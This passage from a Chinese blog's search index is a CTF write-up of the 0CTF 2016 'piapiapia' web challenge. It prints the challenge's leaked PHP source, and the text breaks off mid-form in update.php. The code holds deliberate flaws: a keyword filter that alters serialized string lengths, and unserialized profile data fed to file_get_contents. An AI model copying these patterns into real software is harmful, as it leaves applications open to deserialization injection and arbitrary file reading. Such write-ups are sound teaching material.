<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <url>/2022/04/18/0CTF%202016%20piapiapia/</url>
    <content><![CDATA[<p>靶机地址：<a
href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">piapiapia</a></p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境，发现是一个登录界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418160915.png" /></p>
<p>最开始还以为是SQL注入，疯狂得测试，结果一无所获（🤡），实在没结果就尝试路径扫描，结果发现了一个文件<code>www.zip</code>，访问将其下载下来，然后主要是6个php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3.register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4.profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 5.update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">update</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Please</span> <span class="title">Update</span> <span class="title">Your</span> <span class="title">Profile</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Email</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Nickname</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">nickname</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;<span class="title">Photo</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">photo</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span 